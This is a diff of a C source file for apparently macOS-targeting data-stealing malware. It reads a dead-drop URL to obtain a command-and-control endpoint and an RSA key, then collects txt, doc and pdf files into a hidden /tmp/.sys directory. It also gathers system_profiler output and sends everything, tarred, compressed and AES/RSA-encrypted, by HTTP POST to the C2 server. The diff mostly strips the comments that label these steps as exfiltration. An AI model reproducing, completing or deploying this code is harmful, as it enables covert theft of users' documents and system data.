@@ -1,17 +1,12 @@
 #include <aether.h>
 
-// Global state
 char *_strings[8] = {NULL};
 file_t *files[M_FL] = {NULL};
 int fileCount = 0;
 char tmpDirectory[64] = "/tmp/.sys";
 char C2_ENDPOINT[1024] = {0};
 
-// CURL write callback for network responses
-size_t networkWriteCallback(void *contents,
-                                   size_t size,
-                                   size_t nmemb,
-                                   void *userp) {
+size_t networkWriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t real = size*nmemb;
     mem_buf_t *chunk = userp;
     char *ptr = realloc(chunk->data,
@@ -25,14 +20,13 @@ size_t networkWriteCallback(void *contents,
     return real;
 }
 
-// Fetch RSA public key from URL
 static RSA* grab_rsa(const char *url) {
     if (!url || strlen(url) < 5) return NULL;
     CURL *curl = curl_easy_init();
     if (!curl) return NULL;
 
-    mem_buf_t chunk = { malloc(1), 0 };
-    if (!chunk.data) { curl_easy_cleanup(curl); return NULL; }
+    mem_buf_t chunk = {malloc(1), 0};
+    if (!chunk.data) {curl_easy_cleanup(curl); return NULL;}
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
@@ -47,32 +41,23 @@ static RSA* grab_rsa(const char *url) {
     }
     curl_easy_cleanup(curl);
 
-    BIO *bio = BIO_new_mem_buf(chunk.data,
-                               chunk.size);
-    RSA *rsaPubKey =
-       PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
+    BIO *bio = BIO_new_mem_buf(chunk.data, chunk.size);
+    RSA *rsaPubKey = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
     BIO_free(bio);
     free(chunk.data);
     return rsaPubKey;
 }
 
-// Get Dead-Drop URL from THE strings
 static void _url(char *buf) {
-    if (_strings[0]) { 
-        strcpy(buf, _strings[0]);
-    } else {
-       //  
-    }
+    if (_strings[0]) strcpy(buf, _strings[0]);
 }
 
-// Fetch content from Dead-Drop
 static char* fetch_past(const char *url) {
     CURL *curl = curl_easy_init();
     if (!curl) return NULL;
 
-    mem_buf_t chunk = { malloc(1), 0 };
-    if (!chunk.data) { curl_easy_cleanup(curl);
-                       return NULL; }
+    mem_buf_t chunk = {malloc(1), 0};
+    if (!chunk.data) {curl_easy_cleanup(curl); return NULL;}
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
@@ -89,10 +74,8 @@ static char* fetch_past(const char *url) {
     return chunk.data;
 }
 
-// Parse Dead-Drop content (line1=pubkey URL, line2=C2 endpoint)
-static int from_past(const char *content,
-                     char *pubkey_url,
-                     char *c2_endpoint) {
+/* Parse dead-drop: line1=pubkey URL, line2=C2 endpoint */
+static int from_past(const char *content, char *pubkey_url, char *c2_endpoint) {
     char *copy = strdup(content);
     if (!copy) return 0;
 
@@ -116,16 +99,9 @@ static int from_past(const char *content,
     return 1;
 }
 
-/**
- * wrap_loot - Hybrid crypto wrapper
- * 
- * Encrypts data with AES-128-CBC, wraps AES key with RSA.
- * Format: [4:key_len][encrypted_key][16:iv][4:ct_len][ciphertext]
- */
-static unsigned char* wrap_loot(const unsigned char *plaintext,
-                                size_t plaintext_len,
-                                size_t *out_len,
-                                RSA *rsa_pubkey) {
+/* Hybrid crypto AES-128-CBC + RSA envelope */
+static unsigned char* wrap_loot(const unsigned char *plaintext, size_t plaintext_len,
+                                size_t *out_len, RSA *rsa_pubkey) {
     unsigned char aes_key[16], iv[IV_SIZE];
     if (!RAND_bytes(aes_key, sizeof(aes_key)) ||
         !RAND_bytes(iv, IV_SIZE))
@@ -197,19 +173,17 @@ static unsigned char* wrap_loot(const unsigned char *plaintext,
     return message;
 }
 
-// Copy file from src to dst
 static int copyFile(const char *src, const char *dst) {
-    FILE *fin = fopen(src, "rb"),
-         *fout= fopen(dst, "wb");
-    if (!fin||!fout) {
+    FILE *fin = fopen(src, "rb"), *fout = fopen(dst, "wb");
+    if (!fin || !fout) {
         if (fin) fclose(fin);
         if (fout) fclose(fout);
         return -1;
     }
     char buf[4096];
     size_t n;
-    while ((n=fread(buf,1,sizeof(buf),fin))>0) {
-        if (fwrite(buf,1,n,fout)!=n) {
+    while ((n = fread(buf, 1, sizeof(buf), fin)) > 0) {
+        if (fwrite(buf, 1, n, fout) != n) {
             fclose(fin); fclose(fout);
             return -1;
         }
@@ -218,10 +192,7 @@ static int copyFile(const char *src, const char *dst) {
     return 0;
 }
 
-// Compress data with zlib
-static unsigned char* compressData(const unsigned char *in,
-                                   size_t inLen,
-                                   size_t *outLen) {
+static unsigned char* compressData(const unsigned char *in, size_t inLen, size_t *outLen) {
     uLongf destLen = compressBound(inLen);
     unsigned char *out = malloc(destLen);
     if (!out) return NULL;
@@ -233,32 +204,27 @@ static unsigned char* compressData(const unsigned char *in,
     return out;
 }
 
-// File types to exfiltrate
-static const char *ALLOWED[] = { "txt","doc","pdf",NULL };
+static const char *ALLOWED[] = {"txt", "doc", "pdf", NULL};
 
-// nftw callback - collects interesting files
-static int fileCollector(const char *fpath,
-                         const struct stat *sb,
-                         int typeflag,
-                         struct FTW *ftwbuf) {
+/* nftw callback collect interesting files */
+static int fileCollector(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
     (void)ftwbuf;
     if (fileCount >= M_FL) return 0;
     if (typeflag == FTW_F && sb->st_size > 0) {
         const char *ext = strrchr(fpath, '.');
         if (ext && ext != fpath) {
             ext++;
-            for (int i=0; ALLOWED[i]; i++){
-                if (strcasecmp(ext, ALLOWED[i])==0){
+            for (int i = 0; ALLOWED[i]; i++) {
+                if (strcasecmp(ext, ALLOWED[i]) == 0) {
                     char *copy = strdup(fpath);
                     if (!copy) break;
                     char *base = strdup(basename(copy));
                     free(copy);
                     if (!base) break;
-                    char dst[512]={0};
-                    snprintf(dst,sizeof(dst),"%s/%s",
-                             tmpDirectory, base);
+                    char dst[512] = {0};
+                    snprintf(dst, sizeof(dst), "%s/%s", tmpDirectory, base);
                     free(base);
-                    if (copyFile(fpath,dst)==0) {
+                    if (copyFile(fpath, dst) == 0) {
                         file_t *o = malloc(sizeof(file_t));
                         if (!o) break;
                         o->path = strdup(dst);
@@ -273,53 +239,39 @@ static int fileCollector(const char *fpath,
     return 0;
 }
 
-// POST data to C2
-static void overn_out(const char *server_url,
-               const unsigned char *data,
-               size_t size) {
-    if (!server_url||strlen(server_url)<5) return;
+static void overn_out(const char *server_url, const unsigned char *data, size_t size) {
+    if (!server_url || strlen(server_url) < 5) return;
     CURL *curl = curl_easy_init();
     if (!curl) return;
-    struct curl_slist *hdr =
-    hdr = curl_slist_append(NULL, _strings[1]);
+    struct curl_slist *hdr = curl_slist_append(NULL, _strings[1]);
     curl_easy_setopt(curl, CURLOPT_URL, server_url);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdr);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,
-                     data);
-    curl_easy_setopt(curl,
-                     CURLOPT_POSTFIELDSIZE, size);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, size);
     (void)curl_easy_perform(curl);
     curl_slist_free_all(hdr);
     curl_easy_cleanup(curl);
 }
 
-// Bundle collected files into tar, compress, encrypt, exfil
 static void sendFilesBundle(RSA *rsaPubKey) {
     if (!fileCount) return;
-    char archivePath[512]={0};
+    char archivePath[512] = {0};
     const char *tmpId = tmpDirectory + 5;
-       if (_strings[3]) {
-        snprintf(archivePath, sizeof(archivePath), _strings[3], tmpId);
-    } else {
-        
-    }
+    if (_strings[3]) snprintf(archivePath, sizeof(archivePath), _strings[3], tmpId);
 
-    char tarcmd[1024]={0};
-    snprintf(tarcmd,sizeof(tarcmd),
-             _strings[2],
-             archivePath, tmpDirectory);
+    char tarcmd[1024] = {0};
+    snprintf(tarcmd, sizeof(tarcmd), _strings[2], archivePath, tmpDirectory);
     if (system(tarcmd)) return;
 
-    FILE *fp = fopen(archivePath,"rb");
+    FILE *fp = fopen(archivePath, "rb");
     if (!fp) return;
-    fseek(fp,0,SEEK_END);
+    fseek(fp, 0, SEEK_END);
     long archiveSize = ftell(fp);
-    fseek(fp,0,SEEK_SET);
+    fseek(fp, 0, SEEK_SET);
 
     unsigned char *archiveData = malloc(archiveSize);
-    if (!archiveData) { fclose(fp); return; }
-    if (fread(archiveData,1,archiveSize,fp)
-        != (size_t)archiveSize) {
+    if (!archiveData) {fclose(fp); return;}
+    if (fread(archiveData, 1, archiveSize, fp) != (size_t)archiveSize) {
         fclose(fp);
         free(archiveData);
         return;
@@ -328,65 +280,45 @@ static void sendFilesBundle(RSA *rsaPubKey) {
     unlink(archivePath);
 
     size_t compSize = 0;
-    unsigned char *compData = compressData(archiveData,
-                                           archiveSize,
-                                           &compSize);
+    unsigned char *compData = compressData(archiveData, archiveSize, &compSize);
     free(archiveData);
     if (!compData) return;
 
     size_t packagedLen = 0;
-    unsigned char *pkg = wrap_loot(compData,
-                                   compSize,
-                                   &packagedLen,
-                                   rsaPubKey);
+    unsigned char *pkg = wrap_loot(compData, compSize, &packagedLen, rsaPubKey);
     free(compData);
     if (pkg) {
-        overn_out(C2_ENDPOINT,
-                  pkg, packagedLen);
+        overn_out(C2_ENDPOINT, pkg, packagedLen);
         free(pkg);
     }
 }
 
-/**
- * profiler - Collect system info via system_profiler
- * 
- * Runs system_profiler and captures output into buffer.
- */
 static void profiler(char *buffer, size_t bufsize, size_t *offset) {
     const char *cmd = _strings[4];
-    
     FILE *fp = popen(cmd, "r");
     if (!fp) return;
 
-    const char *info_header = _strings[5];
     char line[1035];
-    while (fgets(line,sizeof(line),fp))
-        *offset += snprintf(buffer+*offset,
-                            bufsize-*offset,"%s",line);
+    while (fgets(line, sizeof(line), fp))
+        *offset += snprintf(buffer + *offset, bufsize - *offset, "%s", line);
     pclose(fp);
 }
 
-// Collect and exfiltrate system info
 static void collectSystemInfo(RSA *rsaPubKey) {
-    char buff[PS_Z]={0};
+    char buff[PS_Z] = {0};
     size_t offset = 0;
     char system_id[37];
     mint_uuid(system_id);
-   const char *id_format = _strings[6];
-    offset += snprintf(buff+offset, sizeof(buff)-offset, id_format, system_id);
+    const char *id_format = _strings[6];
+    offset += snprintf(buff + offset, sizeof(buff) - offset, id_format, system_id);
     const char *host_header = _strings[7];
-    offset += snprintf(buff+offset, sizeof(buff)-offset, host_header);
-    profiler(buff,sizeof(buff),&offset);
+    offset += snprintf(buff + offset, sizeof(buff) - offset, host_header);
+    profiler(buff, sizeof(buff), &offset);
 
     size_t packaged_len = 0;
-    unsigned char *packaged =
-      wrap_loot((unsigned char*)buff,
-                offset,
-                &packaged_len,
-                rsaPubKey);
+    unsigned char *packaged = wrap_loot((unsigned char*)buff, offset, &packaged_len, rsaPubKey);
     if (packaged) {
-        overn_out(C2_ENDPOINT,
-                  packaged, packaged_len);
+        overn_out(C2_ENDPOINT, packaged, packaged_len);
         free(packaged);
     }
 }
@@ -397,16 +329,7 @@ void mint_uuid(char *id) {
     uuid_unparse(uuid, id);
 }
 
-/**
- * sendProfile - Main exfiltration routine
- * 
- * Flow:
- * 1. Fetch C2 config from Dead-Drop
- * 2. Get RSA pubkey
- * 3. Collect system info
- * 4. Hunt and exfil files
- * 5. Clean up
- */
+/* Main exfil fetch C2 config, collect system info, hunt files */
 int sendProfile(void) {
     if (mkdir(tmpDirectory, 0700) == -1 && errno != EEXIST) {
         panic();
